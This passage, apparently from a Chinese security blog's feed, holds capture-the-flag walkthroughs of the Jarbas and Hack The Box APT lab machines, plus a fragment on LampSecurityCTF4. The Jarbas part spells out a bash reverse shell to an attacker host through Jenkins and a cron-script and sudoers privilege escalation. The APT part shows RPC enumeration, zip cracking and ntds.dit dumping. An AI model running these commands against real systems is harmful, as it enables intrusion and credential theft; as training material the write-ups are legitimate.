src="http://42.193.172.120:8088/images/2023/03/28/image-20230329000239530.png" alt="image-20230329000239530"></p><h3 id="目录穿越"><a href="#目录穿越" class="headerlink" title="目录穿越"></a>目录穿越</h3><p>上文提到url的访问格式是   <code>index.html?page=blog&amp;title=Blog&amp;id=2</code>推断源码为<code>include($_GET[$page].&#39;.php&#39;)</code></p><p>利用whatweb分析出其php版本为5.1.2， php版本小于5.3.4，存在%00截断</p><p><img src="http://42.193.172.120:8088/images/2023/03/28/image-20230329001412916.png" alt="image-20230329001412916"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;LampSecurityCTF4&quot;&gt;&lt;a href=&quot;#LampSecurityCTF4&quot; class=&quot;headerlink&quot; title=&quot;LampSecurityCTF4&quot;&gt;&lt;/a&gt;LampSecurityCTF4&lt;/h1&gt;&lt;h2 id=&quot;信息收集&quot;&gt;&lt;a </summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="http://ljx-go.top/2023/04/08/JARBAS/"/>
    <id>http://ljx-go.top/2023/04/08/JARBAS/</id>
    <published>2023-04-08T12:47:51.661Z</published>
    <updated>2023-03-11T15:40:32.016Z</updated>
    
    <content type="html"><![CDATA[<h2 id="靶场介绍"><a href="#靶场介绍" class="headerlink" title="靶场介绍"></a>靶场介绍</h2><p>靶机名：JARBAS</p><p>Jarbas靶场下载地址: <a href="https://download.vulnhub.com/jarbas/Jarbas.zip">https://download.vulnhub.com/jarbas/Jarbas.zip</a></p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h3><p>靶机IP地址 192.168.37.139</p><p><img src="http://42.193.172.120:8088/images/2023/03/09/image-20230309210231914.png" alt="image-20230309210231914"></p><h3 id="nmap扫描"><a href="#nmap扫描" class="headerlink" title="nmap扫描"></a>nmap扫描</h3><p><code>nmap --min-rate 10000 -p- 192.168.37.139</code></p><p>两次扫描有不同的结果 因此我们尽量在扫描时重复一次 防止端口漏扫</p><p><img src="http://42.193.172.120:8088/images/2023/03/09/image-20230309222737897.png" alt="image-20230309222737897"></p><p>查询端口服务对应的版本</p><p><code>nmap -sT -sV -O -p22,80,3306,8080 192.168.37.139</code></p><p><img src="http://42.193.172.120:8088/images/2023/03/09/image-20230309223124729.png" alt="image-20230309223124729"></p><p><code>nmap -sU -p22,80,3306,8080 192.168.37.139</code></p><p><img src="http://42.193.172.120:8088/images/2023/03/09/image-20230309223208609.png" alt="image-20230309223208609"></p><p>nmap漏洞扫描</p><p><code>nmap --script=vuln -p22,80,3306,8080 192.168.37.139</code></p><p><img src="http://42.193.172.120:8088/images/2023/03/09/image-20230309223711562.png" alt="image-20230309223711562"></p><p>在80端口中发现潜在的目录列表 &#x2F;icons</p><p>在8080端口中发现&#x2F;robots.txt文件</p><p>访问80端口web服务</p><p><img src="http://42.193.172.120:8088/images/2023/03/09/image-20230310004017066.png" alt="image-20230310004017066"></p><p>访问8080端口</p><p><img src="http://42.193.172.120:8088/images/2023/03/09/image-20230310003928522.png" alt="image-20230310003928522"></p><p>疑似后台登陆账密</p><h3 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h3><p><code>dirsearch -u 192.168.37.139 -x 403</code></p><p><img src="http://42.193.172.120:8088/images/2023/03/09/image-20230310001619389.png" alt="image-20230310001619389"></p><p>访问access.html</p><p><img src="http://42.193.172.120:8088/images/2023/03/09/image-20230310003639361.png" alt="image-20230310003639361"></p><p>一眼md5加密  解密得到</p><p><img src="http://42.193.172.120:8088/images/2023/03/09/image-20230310003705540.png" alt="image-20230310003705540"></p><p>对应的数据如下</p><table><thead><tr><th>user</th><th>passwd</th></tr></thead><tbody><tr><td>tiago</td><td>italia99</td></tr><tr><td>trindade</td><td>vipsu</td></tr><tr><td>eder</td><td>marianna</td></tr></tbody></table><p>用于8080端口登陆，在经过上述对应账密登陆失败后，通过打乱搭配尝试登陆</p><p>最终eder vipsu 登陆 （此处由于数据内容较少没有bp，当数据过多时则需要用bp快速找出正确账号密码）</p><h2 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h2><p><img src="http://42.193.172.120:8088/images/2023/03/10/image-20230310110850713.png" alt="image-20230310110850713"></p><p>在New Item处可以创建一个新项目 尝试创建一个名为test1的项目，在设置项目时看到Build选项中存在<code>Execute shell</code> 此处我们可以通过bash getshell</p><p><img src="http://42.193.172.120:8088/images/2023/03/10/image-20230310111518081.png" alt="image-20230310111518081"></p><p>getshell语句为：<code>/bin/bash -i &gt;&amp; /dev/tcp/192.168.37.135/7777 0&gt;&amp;1 </code></p><table><thead><tr><th>命令</th><th>命令详解</th></tr></thead><tbody><tr><td>bash -i</td><td>产生一个bash交互环境。</td></tr><tr><td>&gt;&amp;</td><td>将联合符号前面的内容与后面相结合，然后一起重定向给后者。</td></tr><tr><td>&#x2F;dev&#x2F;tcp&#x2F;192.168.37.135&#x2F;7777</td><td>Linux环境中所有的内容都是以文件的形式存在的，其实大家一看见这个内容就能明白，就是让目标主机与攻击机192.168.37.135的7777端口建立一个tcp连接。</td></tr><tr><td>0&gt;&amp;1</td><td>将标准输入与标准输出的内容相结合，然后重定向给前面标准输出的内容。</td></tr></tbody></table><p>Bash反弹一句完整的解读过程就是：</p><blockquote><p>Bash产生了一个交互环境和本地主机主动发起与攻击机7777端口建立的连接（即TCP 7777会话连接）相结合，然后在重定向个TCP 7777会话连接，最后将用户键盘输入与用户标准输出相结合再次重定向给一个标准的输出，即得到一个Bash反弹环境。</p></blockquote><p>攻击机本地监听7777端口 成功连接</p><p><img src="http://42.193.172.120:8088/images/2023/03/10/image-20230310113033089.png" alt="image-20230310113033089"></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>查询shell的权限</p><p><code>sudo -l</code></p><p><img src="http://42.193.172.120:8088/images/2023/03/10/image-20230310230354149.png" alt="image-20230310230354149"></p><p>无任何权限，需要提权</p><p>查询定时任务</p><blockquote><p>定时任务（cron job）被用于安排那些需要被周期性执行的命令。利用它，你可以配置某些命令或者脚本，让它们在某个设定的时间内周期性地运行。cron 是 Linux 或者类 Unix 系统中最为实用的工具之一。cron 服务（守护进程）在系统后台运行，并且会持续地检查 <code>/etc/crontab</code> 文件和 <code>/etc/cron.*/</code> 目录。它同样也会检查 &#x2F;var&#x2F;spool&#x2F;cron&#x2F; 目录。</p></blockquote><p><img src="http://42.193.172.120:8088/images/2023/03/10/image-20230310232437353.png" alt="image-20230310232437353"></p><p>存在一个定时任务</p><p>任务解释：每5分钟以root权限执行&#x2F;etc&#x2F;script&#x2F;CleaningScript.sh ，执行的结果将被丢弃</p><p>脚本内容如下  </p><p><img src="http://42.193.172.120:8088/images/2023/03/10/image-20230310232715965.png" alt="image-20230310232715965"></p><p>方法一</p><p>将getshell payload 写入&#x2F;etc&#x2F;script&#x2F;CleaningScript.sh  同时监听7776端口待执行后可以获得root权限</p><p><img src="http://42.193.172.120:8088/images/2023/03/10/image-20230310233421961.png" alt="image-20230310233421961"></p><p><img src="http://42.193.172.120:8088/images/2023/03/10/image-20230310233705929.png" alt="image-20230310233705929"></p><p>方法二</p><p>修改CleaningScript.sh内容，使它能够修改sudoers，给予jenkins免密码执行sudo的权限。并利用crontab定时执行该任务<br><code>echo &quot;echo &#39;jenkins ALL=(ALL) NOPASSWD:ALL&#39; &gt;&gt; /etc/sudoers&quot; &gt;&gt; /etc/script/CleaningScript.sh</code></p><p>sudoers用来保存一些用户，使这些用户可以通过sudo命令来暂时获取root的权限</p><p>成功获得root权限</p><p><img src="http://42.193.172.120:8088/images/2023/03/10/image-20230310233734120.png" alt="image-20230310233734120"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;靶场介绍&quot;&gt;&lt;a href=&quot;#靶场介绍&quot; class=&quot;headerlink&quot; title=&quot;靶场介绍&quot;&gt;&lt;/a&gt;靶场介绍&lt;/h2&gt;&lt;p&gt;靶机名：JARBAS&lt;/p&gt;
&lt;p&gt;Jarbas靶场下载地址: &lt;a href=&quot;https://download.vuln</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="http://ljx-go.top/2023/04/08/APT/"/>
    <id>http://ljx-go.top/2023/04/08/APT/</id>
    <published>2023-04-08T12:47:51.656Z</published>
    <updated>2023-04-03T08:54:37.179Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ART"><a href="#ART" class="headerlink" title="ART"></a>ART</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>第一次接触域渗透，本文档通过该视频进行学习，记录具体过程与相关知识点，难以做到彻底吃透知识点，但求有所了解</p><p>视频链接：<a href="https://www.bilibili.com/video/BV1FR4y1r7Do/?spm_id_from=333.999.0.0&vd_source=1b2efa03ad2457246e91a7d817aaecae">https://www.bilibili.com/video/BV1FR4y1r7Do/?spm_id_from=333.999.0.0&amp;vd_source=1b2efa03ad2457246e91a7d817aaecae</a></p><blockquote><p>视频简介</p><p>「红队笔记」学渗透必打百台靶机实操精讲-APT 。Hackthebox名为APT靶机的域渗透，即动态目录渗透，Insane级别即疯狂难度级别，无论从用户评价还是官方定级都是高难度级别或接近最高难度级别，知识点密集到让你望而却步，涉及IPv6，密码破解、大量横向移动，Responder提权，LOLBAS , GTFOBins靠山吃山的攻防思想等，既是典型的域渗透样本，也是综合攻防的典范。想实操的需要有hackthebox的vip账户。不实操，只理解思路和学习知识点也是不错的学习方式。全程4k精剪。</p></blockquote><p>该靶机的IP地址为：10.129.96.60</p><h2 id="APT开局"><a href="#APT开局" class="headerlink" title="APT开局"></a>APT开局</h2><h3 id="常规信息收集"><a href="#常规信息收集" class="headerlink" title="常规信息收集"></a>常规信息收集</h3><h4 id="nmap端口扫描"><a href="#nmap端口扫描" class="headerlink" title="nmap端口扫描"></a>nmap端口扫描</h4><p><img src="http://42.193.172.120:8088/images/2023/03/31/image-20230331181729872.png" alt="image-20230331181729872"></p><p><img src="http://42.193.172.120:8088/images/2023/03/31/image-20230331181739263.png" alt="image-20230331181739263"></p><p><img src="http://42.193.172.120:8088/images/2023/03/31/image-20230331182200667.png" alt="image-20230331182200667"></p><p><img src="http://42.193.172.120:8088/images/2023/03/31/image-20230331184925275.png" alt="image-20230331184925275"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">参数分析</span></span><br><span class="line">-sC或--script=default：启动默认类NSE脚本。 //脚本引擎功能（Nmap Scripting Engine，NSE）</span><br></pre></td></tr></table></figure><p>扫描结果分析：</p><p>服务器大概率为：Windows 2016</p><p>开放两个端口：80WEB服务 </p><p>​                            135msrpc服务</p><p>nmap漏洞扫描无结果</p><h4 id="gobuster目录扫描"><a href="#gobuster目录扫描" class="headerlink" title="gobuster目录扫描"></a>gobuster目录扫描</h4><p><img src="http://42.193.172.120:8088/images/2023/03/31/image-20230331190004160.png" alt="image-20230331190004160"></p><p>出现许多301重定向页面，皆无法访问</p><h3 id="Web渗透"><a href="#Web渗透" class="headerlink" title="Web渗透"></a>Web渗透</h3><p>访问80端口并分析</p><p><img src="http://42.193.172.120:8088/images/2023/03/31/image-20230331182316575.png" alt="image-20230331182316575"></p><p>该网站提供虚拟服务器服务的网站，网页类型为html文件，皆为静态页面</p><p><img src="http://42.193.172.120:8088/images/2023/03/31/image-20230331182604813.png" alt="image-20230331182604813"></p><p>页面右上角的SUPPORT为动态页面，可以submit信息</p><p><img src="http://42.193.172.120:8088/images/2023/03/31/image-20230331182658129.png" alt="image-20230331182658129"></p><p>提交信息后出现如上报错，出现一个新ip地址：10.13.38.16</p><p>F12查看页面代码</p><p><img src="http://42.193.172.120:8088/images/2023/03/31/image-20230331184753133.png" alt="image-20230331184753133"></p><p>以post提交内容给ip地址为10.13.38.16的主机</p><p>Ctrl +U查看源码</p><p><img src="http://42.193.172.120:8088/images/2023/03/31/image-20230331185034228.png" alt="image-20230331185034228"></p><p>出现关键词：HTTrack Website Copier&#x2F;3.x </p><blockquote><p>什么是HTTrack Website Copier&#x2F;3.x </p><p>基于windows的图形界面的二进制应用</p><p><img src="http://42.193.172.120:8088/images/2023/03/31/image-20230331185627372.png" alt="image-20230331185627372"></p></blockquote><p>查询利用方式：</p><p>searchexploit查询</p><p><img src="http://42.193.172.120:8088/images/2023/03/31/image-20230331185316059.png" alt="image-20230331185316059"></p><p>无结果</p><p>Google查询</p><p><img src="http://42.193.172.120:8088/images/2023/03/31/image-20230331185355826.png" alt="image-20230331185355826"></p><p>存在堆栈缓冲区溢出漏洞，与应用有关，与web服务无直接关系，无法利用。同时根据上述目录爆破结果显示无法与HTTrack进行交互</p><h3 id="135端口渗透"><a href="#135端口渗透" class="headerlink" title="135端口渗透"></a>135端口渗透</h3><blockquote><p>MSRPC（MicroSoft Remote Procedure Call，微软远程过程调用）</p><p>Depending on the host configuration, the RPC endpoint mapper can be accessed through TCP and UDP port 135, via SMB with a null or authenticated session (TCP 139 and 445), and <strong>as a web service listening on TCP port 593</strong>.</p><p><a href="https://book.hacktricks.xyz/network-services-pentesting/135-pentesting-msrpc">https://book.hacktricks.xyz/network-services-pentesting/135-pentesting-msrpc</a></p><p>RPC</p></blockquote><h4 id="rpcclient"><a href="#rpcclient" class="headerlink" title="rpcclient"></a>rpcclient</h4><p>使用rpcclient工具进行交互 （rpcclient默认的端口号是139，-p 指定端口）</p><p><img src="http://42.193.172.120:8088/images/2023/03/31/image-20230331211600438.png" alt="image-20230331211600438"></p><p>行不通</p><h4 id="impacket-rpcdump-py"><a href="#impacket-rpcdump-py" class="headerlink" title="impacket.rpcdump.py"></a>impacket.rpcdump.py</h4><blockquote><p>impacket python工具包</p><p>环境变量导入：export PATH&#x3D;&#x2F;uer&#x2F;share&#x2F;doc&#x2F;python3-impacket&#x2F;examples:$PATH</p><p><img src="http://42.193.172.120:8088/images/2023/03/31/image-20230331212718559.png" alt="image-20230331212718559"></p><p><strong><a href="https://www.coresecurity.com/corelabs-research/open-source-tools/impacket">Impacket</a>是一个Python类库，用于对SMB1-3或IPv4 &#x2F; IPv6 上的TCP、UDP、ICMP、IGMP，ARP，IPv4，IPv6，SMB，MSRPC，NTLM，Kerberos，WMI，LDAP等协议进行低级编程访问。</strong></p><p><img src="http://42.193.172.120:8088/images/2023/03/31/image-20230331215127389.png" alt="image-20230331215127389"></p><p>Rpcdump.py<br>该脚本将转储在目标上注册的RPC端点和字符串bindings列表。它也会尝试将它们与一些知名的端点进行匹配。 </p><p>要获取目标RPC服务的UUID，可以使用rpcdump工具，它可以列出网络中所有可用的RPC服务以及它们的UUID。一旦找到目标服务的UUID，就可以使用rpcmap进行爆破。</p></blockquote><p><img src="http://42.193.172.120:8088/images/2023/03/31/image-20230331215600258.png" alt="image-20230331215600258"></p><p>将rpc协议下在135端口上运行的组件或方法列出</p><h4 id="impacket-rpcmap-py"><a href="#impacket-rpcmap-py" class="headerlink" title="impacket.rpcmap.py"></a>impacket.rpcmap.py</h4><blockquote><p>rpcmap.py：扫描监听 DCE&#x2F;RPC 接口。这将绑定到 MGMT 接口并获取接口 UUID 列表。如果 MGMT 接口不可用，它会获取在野外看到的接口 UUID 列表，并尝试绑定到每个接口。</p><p>rpcmap的功能类似于端口扫描工具，它会自动检测网络中运行的RPC服务，并提供有关这些服务的详细信息，例如服务名称、绑定端口、支持的协议等。rpcmap还可以使用一些特定的选项来执行漏洞扫描和安全评估，以帮助发现可能存在的安全问题。 </p></blockquote><p><img src="C:\Users\ljx\AppData\Roaming\Typora\typora-user-images\image-20230331221006426.png" alt="image-20230331221006426"></p><p>我们可以通过rpcmap爆破UUID</p><blockquote><p>具体来说，每个RPC接口或服务都有一个唯一的UUID，用于标识该接口或服务。当客户端调用远程过程时，它必须指定要调用的RPC接口或服务的UUID，以便服务器能够找到正确的实现和处理该请求。同样地，当服务器向客户端返回结果时，它也必须使用相同的UUID，以便客户端能够正确地处理返回结果。</p></blockquote><p>相关参数</p><p><img src="http://42.193.172.120:8088/images/2023/03/31/image-20230401004055242.png" alt="image-20230401004055242"></p><p><img src="http://42.193.172.120:8088/images/2023/03/31/image-20230401004646251.png" alt="image-20230401004646251"></p><p><img src="http://42.193.172.120:8088/images/2023/03/31/image-20230401004707539.png" alt="image-20230401004707539"></p><p>爆破出有用的UUID，通过搜索引擎我们来查看具体是什么接口</p><p><img src="http://42.193.172.120:8088/images/2023/03/31/image-20230401004908051.png" alt="image-20230401004908051"></p><p>RPC的IObjectExporter接口</p><p><img src="http://42.193.172.120:8088/images/2023/03/31/image-20230401005126437.png" alt="image-20230401005126437"></p><p>在爆破中显示操作数3和5是success的 对应的内容如上  5是3的扩展</p><p><img src="http://42.193.172.120:8088/images/2023/03/31/image-20230401005902861.png" alt="image-20230401005902861"></p><p><img src="http://42.193.172.120:8088/images/2023/03/31/image-20230401010637676.png" alt="image-20230401010637676"></p><p>谷歌关键词：OXID network Resolver</p><p><img src="http://42.193.172.120:8088/images/2023/03/31/image-20230401010717398.png" alt="image-20230401010717398"></p><p><a href="https://medium.com/nets3c/remote-enumeration-of-network-interfaces-without-any-authentication-the-oxid-resolver-896cff530d37">https://medium.com/nets3c/remote-enumeration-of-network-interfaces-without-any-authentication-the-oxid-resolver-896cff530d37</a></p><p>python利用脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> impacket.dcerpc.v5 <span class="keyword">import</span> transport</span><br><span class="line"><span class="keyword">from</span> impacket.dcerpc.v5.rpcrt <span class="keyword">import</span> RPC_C_AUTHN_LEVEL_NONE <span class="keyword">as</span> authLevel</span><br><span class="line"><span class="keyword">from</span> impacket.dcerpc.v5.dcomrt <span class="keyword">import</span> IObjectExporter</span><br><span class="line">ip = <span class="string">&quot;192.168.1.7&quot;</span></span><br><span class="line">stringBinding = <span class="string">r&#x27;ncacn_ip_tcp:%s&#x27;</span> % ip</span><br><span class="line">rpctransport = transport.DCERPCTransportFactory(stringBinding)</span><br><span class="line">portmap = rpctransport.get_dce_rpc()</span><br><span class="line">portmap.set_auth_level(authLevel)</span><br><span class="line">portmap.connect()</span><br><span class="line">objExporter = IObjectExporter(portmap)</span><br><span class="line">bindings = objExporter.ServerAlive2()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] Retrieving network interface of &quot;</span> + ip)</span><br><span class="line"><span class="keyword">for</span> address <span class="keyword">in</span> bindings:</span><br><span class="line">    NetworkAddr = address[<span class="string">&#x27;aNetworkAddr&#x27;</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Address: &quot;</span> + NetworkAddr)</span><br></pre></td></tr></table></figure><p><img src="http://42.193.172.120:8088/images/2023/03/31/image-20230401010843046.png" alt="image-20230401010843046"></p><p>获得ipv6地址</p><p>过程总结：通过rpcmap映射UUID，并通过暴力破解UUID获得其中一个UUID有交互信息的，通过UUID在搜索引擎搜索其功能，最后通过相关关键字，搜到了ioxidresolver去识别远程网络接口，获取IP地址</p><h3 id="ipv6端口扫描"><a href="#ipv6端口扫描" class="headerlink" title="ipv6端口扫描"></a>ipv6端口扫描</h3><p><img src="http://42.193.172.120:8088/images/2023/03/31/image-20230401013739717.png" alt="image-20230401013739717"></p><p>二次扫描结果</p><p><img src="http://42.193.172.120:8088/images/2023/03/31/image-20230401014445014.png" alt="image-20230401014445014"></p><p>通过这些端口可以判断去这台机器是一台域控制器</p><blockquote><p>#什么是域控制器</p><p>域控制器（Domain Controller）是指运行了Active Directory（AD）服务并存储了用户、计算机等安全主体的账号信息和访问权限信息的计算机。域控制器通过对用户身份进行认证并授予其访问网络资源的权限，实现对整个域的集中管理。</p><p>在一个域中，通常至少需要一个域控制器，它的主要职责是：</p><ol><li>认证用户和计算机的身份：域控制器是域中用户和计算机的安全认证中心，它验证登录请求的身份并授予相应的访问权限。</li><li>管理域中的安全策略：域控制器管理域中的安全策略，包括密码策略、账户锁定策略等，以确保域中的安全性。</li><li>维护域中的目录服务：域控制器存储了域中所有安全主体的账号信息和访问权限信息，同时也包括其他与域相关的信息，如组策略等。</li><li>处理域中的复制：域控制器之间会相互复制域目录数据，以确保域中所有域控制器的数据是同步的。</li></ol><p>在 Windows 系统中，域控制器默认会监听以下端口，可以通过检测这些端口是否打开来判断一台服务器是否为域控制器：</p><ol><li>TCP端口： 135、389、445、636、3268、3269、49152-65535</li><li>UDP端口： 53、88、123、137、138、389</li></ol><p>其中，TCP 135 端口是用于RPC（Remote Procedure Call）服务，是域控制器的主要通信端口；</p><p>TCP 389 端口是LDAP（Lightweight Directory Access Protocol）服务的端口，也是域控制器的核心服务端口；</p><p>TCP 445 端口用于 SMB（Server Message Block）服务</p><p>UDP 389 端口用于LDAP的快速搜索功能；</p><p>TCP 636 端口是LDAP over SSL的安全端口；</p><p><strong>TCP 3269 端口是用于全局目录的LDAP搜索的安全端口；</strong></p><p><strong>UDP 53 端口是DNS（Domain Name System）服务的端口，用于名称解析，</strong></p><p>TCP&#x2F;UDP 88 端口是Kerberos认证服务的端口</p><p>UDP 123 端口是用于时间同步服务的端口；</p><p>UDP 137 和 UDP 138 端口是NetBIOS（Network Basic Input&#x2F;Output System）服务的端口，用于广播查询域控制器。</p></blockquote><p>每个端口作用</p><table><thead><tr><th>端口</th><th>服务</th></tr></thead><tbody><tr><td>53</td><td>用于DNS（域名系统）服务，提供了将域名转换为IP地址的功能。当你在浏览器中输入网址时，计算机需要使用DNS服务来将网址转换为IP地址，以便连接到相应的服务器。</td></tr><tr><td>88</td><td>用于Kerberos身份验证服务，提供了安全的身份验证机制。用户需要使用自己的用户名和密码进行身份验证，以便访问受保护的资源和数据。</td></tr><tr><td>135</td><td>用于远程程序调用服务，也称为RPC服务。当你需要在你的电脑上安装远程服务器管理工具，并在另一台计算机上运行该工具，那么你需要打开 TCP 135 端口，以便进行远程连接和调用。</td></tr><tr><td>389</td><td>用于LDAP（轻量级目录访问协议）服务，提供了对目录中的数据进行查找、添加、删除和修改的功能。当需要访问公司的域控制器来查找某个员工的联系方式或组织结构信息时</td></tr><tr><td>445</td><td>用于SMB（服务器消息块）服务，提供了对共享文件和打印机的访问权限。在一个局域网内，当你需要在两台计算机之间共享文件时，可以使用SMB服务</td></tr><tr><td>464</td><td>用于Kerberos密码更改服务，提供了更改Kerberos身份验证密码的功能。用户需要定期更改他们的密码以提高安全性，Kerberos密码更改服务提供了这个功能。</td></tr><tr><td>593</td><td>用于RPC over HTTP服务，提供了通过HTTP隧道进行远程程序调用的功能。在远程连接到一台计算机时，可以使用RPC over HTTP服务来加密通信以提高安全性。</td></tr><tr><td>636</td><td>用于安全的LDAP通信，也称为LDAP over SSL。在一个企业网络中，当你需要通过LDAP服务来查找或更改受保护的目录数据时，你需要使用安全的LDAP通信，以确保你的通信过程是加密和安全的。</td></tr><tr><td>3268</td><td>用于全局目录服务，提供了对全局目录中的数据进行查找和修改的功能。在一个跨域网络中，当你需要从多个域控制器中查找目录数据时，你需要使用全局目录服务来执行此操作</td></tr><tr><td>3269</td><td>用于安全的全局目录服务，提供了对全局目录中的数据进行安全访问的功能。在一个跨域网络中，当你需要使用安全的方式从多个域控制器中查找目录数据时，你需要使用安全的全局目录服务来执行此操作</td></tr><tr><td>5985</td><td>用于WinRM（Windows远程管理）服务，提供了对远程计算机进行管理和监视的功能。在一个企业网络中，IT管理员需要使用WinRM服务来远程管理和监视多台计算机，以便进行补丁管理、安全策略配置等操作。</td></tr><tr><td>9389</td><td>用于WS-Management服务，提供了对远程计算机进行管理的功能。在一个企业网络中，IT管理员需要使用WS-Management服务来远程管理多台计算机，以便进行软件安装、配置管理等操作。</td></tr></tbody></table><p>处理端口号并用nmap扫描获取具体内容 ——此处需要-6参数 表示ip地址为ipv6地址</p><p><img src="http://42.193.172.120:8088/images/2023/03/31/image-20230401015449612.png" alt="image-20230401015449612"></p><h2 id="ART鏖战"><a href="#ART鏖战" class="headerlink" title="ART鏖战"></a>ART鏖战</h2><p>修改hosts文件解析地址</p><p><img src="C:\Users\ljx\AppData\Roaming\Typora\typora-user-images\image-20230401230407321.png" alt="image-20230401230407321"></p><h3 id="445端口渗透"><a href="#445端口渗透" class="headerlink" title="445端口渗透"></a>445端口渗透<img src="C:\Users\ljx\AppData\Roaming\Typora\typora-user-images\image-20230401231605567.png" alt="image-20230401231605567"></h3><blockquote><p>smbclient 类似ftp的客户端，用于访问服务器上的SMB&#x2F;CIFS资源</p><p>亦存在与ftp类似的匿名登陆 </p></blockquote><p>在要求输入密码时，按回车匿名登陆</p><p>访问上述各个目录</p><p><img src="C:\Users\ljx\AppData\Roaming\Typora\typora-user-images\image-20230401232027945.png" alt="image-20230401232027945"></p><p>get命令下载backup.zip文件</p><p><img src="C:\Users\ljx\AppData\Roaming\Typora\typora-user-images\image-20230401232210493.png" alt="image-20230401232210493"></p><p>无信息（这三个目录为默认目录，一般没什么信息）</p><h3 id="zip文件"><a href="#zip文件" class="headerlink" title="zip文件"></a>zip文件</h3><h4 id="分析zip备份文件"><a href="#分析zip备份文件" class="headerlink" title="分析zip备份文件"></a>分析zip备份文件</h4><p><strong>（优先分析zip文件，勿直接解压存在风险）</strong></p><p><img src="C:\Users\ljx\AppData\Roaming\Typora\typora-user-images\image-20230401233212749.png" alt="image-20230401233212749"></p><blockquote><p>Unzip是一个在计算机上解压缩（解压）文件的命令行工具或软件程序。</p></blockquote><h5 id="Active-Directory-动态目录"><a href="#Active-Directory-动态目录" class="headerlink" title="Active Directory 动态目录"></a>Active Directory 动态目录</h5><p>ntds.dit文件 ——是windows环境中的sam文件</p><blockquote><p>ntds.dit 是 Windows Server 操作系统上 Active Directory 域服务（AD DS）使用的数据库文件，它代表 “NT Directory Service Directory Information Tree”。该文件包含了域中所有对象的信息，如用户、计算机、组等，是 AD DS 数据库的核心文件。</p><p>SAM文件是Windows操作系统中存储本地账户信息的文件，它代表“Security Accounts Manager”，通常存储在%SystemRoot%\System32\Config\SAM中。SAM文件包含了本地计算机上的所有本地账户信息，如用户名、密码散列值、安全标识符（SID）等。当用户进行本地登录验证时，系统会读取SAM文件中的信息进行身份验证。SAM文件是Windows操作系统安全性的关键组成部分，应该受到保护，只允许系统管理员访问。</p></blockquote><p>ntds.jfm文件</p><blockquote><p>NTDS.jfm是Windows Server操作系统上Active Directory域服务（AD DS）使用的日志文件，它代表“NT Directory Service Journal File Metadata”。NTDS.jfm文件记录了在更新Active Directory数据库（NTDS.dit）期间发生的所有操作，包括新增、修改和删除操作等。当NTDS.dit文件发生更改时，操作会被写入NTDS.jfm文件中，以确保数据库的完整性和一致性。NTDS.jfm文件通常存储在%SystemRoot%\NTDS目录中，并只能由AD DS服务访问和修改。在出现故障或数据恢复时，NTDS.jfm文件可以帮助恢复和重建Active Directory数据库。</p></blockquote><h5 id="registry-注册表目录"><a href="#registry-注册表目录" class="headerlink" title="registry 注册表目录"></a>registry 注册表目录</h5><blockquote><p>很有用</p><p>注册表中的 SECURITY 键是 Windows 操作系统中存储安全设置的一个重要分支。它存储了本地计算机安全策略、用户帐户和组、安全标识符（SIDs）等与安全性相关的信息。</p><p>注册表中的 SYSTEM 键是 Windows 操作系统中存储系统配置信息的一个重要分支。它存储了启动过程中系统硬件和软件的配置信息，例如设备驱动程序、系统服务和操作系统的安装配置等。</p></blockquote><p>如果unzip -l没法获取压缩包的内容还可以使用foremost，binwalk命令分析（接触过ctf中杂项的dddd）</p><h4 id="zip文件密码破解"><a href="#zip文件密码破解" class="headerlink" title="zip文件密码破解"></a>zip文件密码破解</h4><p><img src="C:\Users\ljx\AppData\Roaming\Typora\typora-user-images\image-20230401234737166.png" alt="image-20230401234737166"></p><p>zip文件存在密码</p><p><img src="C:\Users\ljx\AppData\Roaming\Typora\typora-user-images\image-20230401235220186.png" alt="image-20230401235220186"></p><p>将图中红框中的哈希值存入hash4backup文件用于密码破解</p><blockquote><p>zip2john工具<strong>将ZIP文件格式转换为John the Ripper程序所需的哈希值格式</strong>，使得用户可以使用John the Ripper程序对ZIP文件进行暴力破解。</p><p>在使用John the Ripper破解程序时，需要对所破解的文件类型为a的文件利用a2john命令进行hash转换，如此时要破解zip类型的文件，则使用zip2john将文件转换成zip ，该程序在kali中用john命令实现</p></blockquote><p>​<img src="C:\Users\ljx\AppData\Roaming\Typora\typora-user-images\image-20230402000009915.png" alt="image-20230402000009915"></p><blockquote><p>rockyou.txt是一个常用的密码字典文件，包含了数百万条常用密码和常见字符串组合。该文件由密码管理公司RockYou于2009年遭受数据泄露事件中泄露出来，并因此成为了一个广泛使用的密码字典。由于rockyou.txt中包含了大量常用密码和字符串组合，因此它是密码破解和渗透测试工具中广泛使用的一个字典文件。</p></blockquote><p>成功获取密码：iloveyousomuch</p><h3 id="ntds数据提取与处理"><a href="#ntds数据提取与处理" class="headerlink" title="ntds数据提取与处理"></a>ntds数据提取与处理</h3><p>由于ntds.dit文件 中存放着密码等信息，用impacket库中的serectsdump.py读取</p><p><img src="C:\Users\ljx\AppData\Roaming\Typora\typora-user-images\image-20230402002338557.png" 